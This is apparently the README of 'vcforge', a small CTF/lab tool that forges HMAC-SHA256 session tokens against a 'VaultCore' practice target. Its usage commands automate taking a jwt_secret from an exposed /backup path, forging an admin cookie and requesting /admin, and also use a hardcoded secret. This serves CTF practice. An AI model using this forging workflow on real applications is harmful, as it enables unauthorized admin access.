# vcforge

*created by brawlnic*

Forge `payload.signature` session tokens (HMAC-SHA256) and use them against
a target — VaultCore lab / CTF format. Zero dependencies.

## Install

```bash
pipx install .   # or: pip install --user .
```

## Usage

```bash
# fully automatic: grab jwt_secret from the target's /backup,
# forge an admin token, request /admin, print the flag
vcf auto                          # default target http://172.24.64.1:1337
vcf auto http://host:port

# manual forge: print the token
vcf vcore_admin admin vcore_sup3r_s3cr3t_2024

# forge + immediately GET a URL with the cookie
vcf vcore_admin admin vcore_sup3r_s3cr3t_2024 -u http://172.24.64.1:1337/admin

vcf --help
```

As a library:

```python
from vcforge import forge
token = forge("vcore_admin", "admin", "secret")
```
